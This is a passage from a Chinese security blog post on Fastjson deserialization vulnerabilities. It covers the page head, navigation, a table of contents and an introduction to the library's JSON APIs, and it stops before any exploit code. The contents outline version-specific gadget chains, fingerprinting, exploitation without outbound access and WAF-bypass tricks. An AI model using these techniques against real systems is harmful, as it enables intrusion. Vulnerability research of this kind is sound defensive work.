<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="FastJson是一个由阿里巴巴开发的高性能Java语言JSON处理库。它以快速高效著称，在解析和序列化JSON数据时速度优势明显，能够快速处理大量JSON数据。其API简单易用，通过简单的方法如JSON.toJSONString()和JSON.parseObject()等就能轻松实现Java对象和JSON字符串之间的相互转换。它支持多种Java数据类型，包括基本类型、包装类型、数组、集合和自定">
<meta property="og:type" content="article">
<meta property="og:title" content="Cursory Analysis Of Fastjson">
<meta property="og:url" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/index.html">
<meta property="og:site_name" content="H3rmesk1t&#39;s Blog">
<meta property="og:description" content="FastJson是一个由阿里巴巴开发的高性能Java语言JSON处理库。它以快速高效著称，在解析和序列化JSON数据时速度优势明显，能够快速处理大量JSON数据。其API简单易用，通过简单的方法如JSON.toJSONString()和JSON.parseObject()等就能轻松实现Java对象和JSON字符串之间的相互转换。它支持多种Java数据类型，包括基本类型、包装类型、数组、集合和自定">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1734677323298-afec7a2d-361a-49df-bb36-744a2f5d38c0.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1734678056721-e6f2827c-b967-4208-8433-bb250afbb990.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1734678597071-144cf5a4-7c60-4d2d-aa37-06b2cf286e83.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1735010751608-3197b2fc-5e3b-44ab-841c-2b038797f199.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1735011746312-b1ddc479-79f9-4c05-8fd6-7522ab17ac54.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1735012086010-ad7ad6e6-229b-418b-b0bd-f15c056cd9c1.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1735012176374-9977adbf-c0dc-4e05-97da-2c711e5b4ad0.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1735012268675-6fe08c05-3986-43d3-92c0-d877a484e498.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1735012302569-8f5aa7e4-4058-4060-a2a9-706d5af21abe.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1735013192265-11077587-a39e-4adf-b746-5f02d83d3670.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1735013350422-abacfe4f-5f00-4a6a-8c3a-f6607d1347cc.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1735013745008-305c043e-bea0-4f35-adc4-b7429a41e3ec.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1735013760964-aba7ffbd-70e4-4b69-a538-97e4662dfd3a.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1735013791563-06ede5e6-36d4-4d19-90b7-243889158efa.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1735014092313-29bcc42d-6f9b-4772-9a7a-4f15f31a93b9.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1735014669978-70ef0731-d5cc-4e8e-90ab-e9f794eba4b3.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1735014875681-886c6c57-e798-4d44-b470-7489ae8a39f9.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1734790104587-c761e5cc-7cd5-41ac-af4a-1eda1196eab0.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1734936323630-c91bf7ea-f24a-4cc6-ae2d-359d1b85e371.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1734936675630-e53eff98-9dd3-4207-86bc-bfe87b0c03d9.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1734936712641-44c1bb74-d7e1-4550-a8a3-624d1520c912.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1734936926835-1b9244df-58a8-47e4-a2f2-83ebd2bd263a.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1734937642256-3510586a-de4a-47f7-bd74-e55428e0c715.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1734937558578-1fe215e0-4227-4745-b9d3-4bca0c62f7fc.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1734938610334-d429eb5e-8f43-43e1-9545-7f9e12d09d5c.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1734941786228-1e88fde6-e19c-46d2-be7d-0592729c1e50.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1734943478841-70c4e764-3299-4c5e-8c6a-3bf1e7dfbdce.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1734944059796-518382bc-2a14-4794-b2b5-645ef2a1135b.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1734945627762-10b00bb7-a1c9-411c-b8fa-b27cdd038807.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1734946177191-de2df3bb-e347-44c1-8a80-c5b82871699c.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1734946529587-cfc2b592-0a18-489a-9f81-964d7cfe39b5.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1734947418766-c2a9691d-adf6-4d4b-a480-948ac04dfe10.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1734948910241-e17c27a1-7825-4dd1-8261-48a808d0ecdc.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1734949131722-9d7395da-0bc0-4e85-9539-e1a59ec35b28.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1734949291874-cfd88bd5-5ab3-4c27-83d8-cc980d49daa3.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1734949618443-a02004be-efee-43ee-b4cd-7e624f30d6b3.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1734951327786-d2fd31f4-55ba-48ce-9d5e-c2e2a033a599.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1734969027005-613a6571-46a6-4280-a854-58915b2a2582.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1734969134637-d9f7d7a1-884c-4a18-983a-aff533460cd0.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1734969263876-d069722f-f4ab-4330-ac02-b0b77796f5b3.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1735020524736-d1090dc7-9294-4473-a759-5a7b82cf9d81.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1735020496731-440bac7b-743c-4692-834c-aa7f9baa3095.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1735020960453-f372314f-4aa5-4895-9809-6bf62932009d.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1735020696891-11c76363-796b-4b25-9de9-d42604829339.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1735020803959-2574b6f3-1cbf-4405-8380-86059951e861.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1735020860923-f424285d-900d-4762-882a-0c9e70d7858f.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1735021139457-0281377f-2dc7-4079-8d90-f64d9ef413ac.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1735021286861-8675dc87-87f7-43ff-aae3-8ebd358563c2.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1735021315795-b309fd92-4995-40a1-889c-09d9eb97d55b.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1735021881637-5cced3aa-3bcd-4edb-a74d-5fe27cc8bf7f.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1735022258058-5e288915-6771-4070-87be-ee07200b1473.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1735039307088-0c250fe5-7e08-414d-b31f-84ae5e972351.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1735039677606-f8d22ae1-ac3f-4052-84b1-5d5f7944b347.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1735042059477-90d803b3-e76e-4114-8d4d-fcf30fc8c9be.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1735043638422-3f98c53a-30eb-40cf-b9d6-32373daf4019.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1735043481307-64af2ec3-e6f1-4e51-b8f1-f7cb624cf857.png">
<meta property="article:published_time" content="2024-12-24T13:00:00.000Z">
<meta property="article:modified_time" content="2024-12-24T13:05:19.899Z">
<meta property="article:author" content="H3rmesk1t">
<meta property="article:tag" content="Java">
<meta property="article:tag" content="Fastjson">
<meta property="article:tag" content="组件安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/1734677323298-afec7a2d-361a-49df-bb36-744a2f5d38c0.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/my-logo.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/my-logo-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/my-logo.png">
        
      
    
    <!-- title -->
    <title>Cursory Analysis Of Fastjson</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="H3rmesk1t&#39;s Blog" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/12/25/Fastjson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/&text=Cursory Analysis Of Fastjson"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/&title=Cursory Analysis Of Fastjson"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/&is_video=false&description=Cursory Analysis Of Fastjson"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Cursory Analysis Of Fastjson&body=Check out this article: https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/&title=Cursory Analysis Of Fastjson"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/&title=Cursory Analysis Of Fastjson"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/&title=Cursory Analysis Of Fastjson"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/&title=Cursory Analysis Of Fastjson"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/&name=Cursory Analysis Of Fastjson&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://h3rmesk1t.github.io/2024/12/24/Cursory-Analysis-Of-Fastjson/&t=Cursory Analysis Of Fastjson"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%86%B5"><span class="toc-number">2.</span> <span class="toc-text">基本概况</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Object2JSON"><span class="toc-number">2.1.</span> <span class="toc-text">Object2JSON</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JSON2Object"><span class="toc-number">2.2.</span> <span class="toc-text">JSON2Object</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#parse-parseObject"><span class="toc-number">2.3.</span> <span class="toc-text">parse&amp;parseObject</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getter-setter"><span class="toc-number">2.4.</span> <span class="toc-text">getter&amp;setter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#parse%E7%AA%81%E7%A0%B4%E7%89%B9%E6%AE%8Agetter%E8%B0%83%E7%94%A8%E9%99%90%E5%88%B6"><span class="toc-number">2.5.</span> <span class="toc-text">parse突破特殊getter调用限制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ref"><span class="toc-number">2.5.1.</span> <span class="toc-text">$ref</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JSONObject"><span class="toc-number">2.5.2.</span> <span class="toc-text">JSONObject</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-24"><span class="toc-number">3.1.</span> <span class="toc-text">fastjson-1.2.24</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TemplatesImpl"><span class="toc-number">3.1.1.</span> <span class="toc-text">TemplatesImpl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JdbcRowSetImpl"><span class="toc-number">3.1.2.</span> <span class="toc-text">JdbcRowSetImpl</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-25"><span class="toc-number">3.2.</span> <span class="toc-text">fastjson-1.2.25</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-42"><span class="toc-number">3.3.</span> <span class="toc-text">fastjson-1.2.42</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-43"><span class="toc-number">3.4.</span> <span class="toc-text">fastjson-1.2.43</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-44"><span class="toc-number">3.5.</span> <span class="toc-text">fastjson-1.2.44</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-45"><span class="toc-number">3.6.</span> <span class="toc-text">fastjson-1.2.45</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-47"><span class="toc-number">3.7.</span> <span class="toc-text">fastjson-1.2.47</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-68"><span class="toc-number">3.8.</span> <span class="toc-text">fastjson-1.2.68</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#commons-io"><span class="toc-number">3.8.1.</span> <span class="toc-text">commons-io</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#CharSequenceInputStream"><span class="toc-number">3.8.1.1.</span> <span class="toc-text">CharSequenceInputStream</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#FileWriterWithEncoding"><span class="toc-number">3.8.1.2.</span> <span class="toc-text">FileWriterWithEncoding</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WriterOutputStream"><span class="toc-number">3.8.1.3.</span> <span class="toc-text">WriterOutputStream</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#TeeInputStream"><span class="toc-number">3.8.1.4.</span> <span class="toc-text">TeeInputStream</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#BOMInputStream"><span class="toc-number">3.8.1.5.</span> <span class="toc-text">BOMInputStream</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-80"><span class="toc-number">3.9.</span> <span class="toc-text">fastjson 1.2.80</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Groovy"><span class="toc-number">3.9.1.</span> <span class="toc-text">Groovy</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JDBC"><span class="toc-number">3.9.2.</span> <span class="toc-text">JDBC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Aspectj"><span class="toc-number">3.9.3.</span> <span class="toc-text">Aspectj</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Trick"><span class="toc-number">4.</span> <span class="toc-text">Trick</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B"><span class="toc-number">4.1.</span> <span class="toc-text">信息探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF%E6%9D%A5%E8%8E%B7%E5%8F%96%E7%89%88%E6%9C%AC%E5%8F%B7"><span class="toc-number">4.1.1.</span> <span class="toc-text">利用报错信息来获取版本号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E6%8A%A5%E9%94%99%E8%BF%9B%E8%A1%8Cfastjson%E7%89%88%E6%9C%AC%E6%8E%A2%E6%B5%8B"><span class="toc-number">4.1.2.</span> <span class="toc-text">无报错进行fastjson版本探测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8DNS%E8%AF%B7%E6%B1%82%E6%9D%A5%E6%8E%A2%E6%B5%8Bfastjson%E7%89%88%E6%9C%AC"><span class="toc-number">4.1.3.</span> <span class="toc-text">利用DNS请求来探测fastjson版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8FastJson%E7%9A%84%E5%9B%9E%E6%98%BE%E6%8A%A5%E9%94%99%E6%8E%A2%E6%B5%8B%E4%BE%9D%E8%B5%96"><span class="toc-number">4.1.4.</span> <span class="toc-text">利用FastJson的回显报错探测依赖</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.</span> <span class="toc-text">不出网利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TemplatesImpl-1"><span class="toc-number">4.2.1.</span> <span class="toc-text">TemplatesImpl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#C3P0%E9%93%BEHEX%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E8%8A%82%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">4.2.2.</span> <span class="toc-text">C3P0链HEX序列化字节加载器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%86%99%E5%85%A5"><span class="toc-number">4.2.3.</span> <span class="toc-text">文件读取写入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BCEL"><span class="toc-number">4.2.4.</span> <span class="toc-text">BCEL</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass-WAF"><span class="toc-number">4.3.</span> <span class="toc-text">Bypass WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6"><span class="toc-number">4.3.1.</span> <span class="toc-text">空白字符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E5%AD%97%E7%AC%A6"><span class="toc-number">4.3.2.</span> <span class="toc-text">注释字符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AF%E7%9A%84Feature"><span class="toc-number">4.3.3.</span> <span class="toc-text">默认开启的Feature</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E7%A0%81"><span class="toc-number">4.3.4.</span> <span class="toc-text">编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%99%BA%E8%83%BD%E5%8C%B9%E9%85%8D"><span class="toc-number">4.3.5.</span> <span class="toc-text">智能匹配</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Cursory Analysis Of Fastjson
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">H3rmesk1t</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-12-24T13:00:00.000Z" class="dt-published" itemprop="datePublished">2024-12-24</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/Java/">Java</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/Fastjson/" rel="tag">Fastjson</a>, <a class="p-category" href="/tags/Java/" rel="tag">Java</a>, <a class="p-category" href="/tags/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/" rel="tag">组件安全</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <blockquote>
<p><font style="color:#000000;">FastJson是一个由阿里巴巴开发的高性能Java语言JSON处理库。它以快速高效著称，在解析和序列化JSON数据时速度优势明显，能够快速处理大量JSON数据。其API简单易用，通过简单的方法如JSON.toJSONString()和JSON.parseObject()等就能轻松实现Java对象和JSON字符串之间的相互转换。它支持多种Java数据类型，包括基本类型、包装类型、数组、集合和自定义对象，对于复杂嵌套结构也能很好地处理，并且它有灵活的配置选项，可定制序列化和反序列化行为。</font></p>
</blockquote>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><font style="color:#000000;">在攻防实战或漏洞挖掘期间，会经常遇见使用了该组件的系统，针对不同版本、不同环境的利用思路会有些不同，本文简单总结了FastJSON各版本的漏洞分析及利用情况。</font></p>
<h2 id="基本概况"><a href="#基本概况" class="headerlink" title="基本概况"></a>基本概况</h2><h3 id="Object2JSON"><a href="#Object2JSON" class="headerlink" title="Object2JSON"></a>Object2JSON</h3><p><font style="color:#000000;">将类序列化为JSON数据最常用的方法为JSON#toJSONString ，该方法有若干重载方法，带有不同的参数，其中常用的包括以下几个。</font></p>
<ol>
<li><font style="color:#000000;">序列化特性（</font><font style="color:#000000;background-color:#ffffff;">SerializerFeature</font><font style="color:#000000;">）：com.alibaba.fastjson.serializer.SerializerFeature，可以通过设置多个特性到FastjsonConfig中全局使用，也可以在使用具体方法中指定特性</font></li>
<li><font style="color:#000000;">序列化过滤器（</font><font style="color:#000000;background-color:#ffffff;">SerializeFilter</font><font style="color:#000000;">）：com.alibaba.fastjson.serializer.SerializeFilter，这是一个接口，通过配置它的子接口或者实现类就可以以扩展编程的方式实现定制序列化</font></li>
<li><font style="color:#000000;">序列化时的配置（</font><font style="color:#000000;background-color:#ffffff;">SerializeConfig</font><font style="color:#000000;">）：com.alibaba.fastjson.serializer.SerializeConfig ，可以添加特点类型自定义的序列化配置</font></li>
</ol>
<h3 id="JSON2Object"><a href="#JSON2Object" class="headerlink" title="JSON2Object"></a>JSON2Object</h3><p><font style="color:#000000;">将JSON数据反序列化时常用的方法为JSON#parse、JSON#parseObject、JSON#parseArray，这三个方法也均包含若干重载方法，带有不同参数：</font></p>
<ol>
<li><font style="color:#000000;">反序列化特性（Feature）：com.alibaba.fastjson.parser.Feature</font></li>
